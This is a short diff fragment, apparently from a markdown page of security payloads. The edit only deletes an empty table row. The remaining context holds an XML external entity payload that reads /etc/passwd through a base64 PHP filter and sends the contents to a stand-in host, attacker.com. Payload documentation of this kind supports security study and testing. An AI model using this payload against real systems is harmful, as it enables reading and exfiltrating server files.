@@ -7,9 +7,6 @@
    ```
 
 
-|------|------|---------|------|
-
-
 ```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
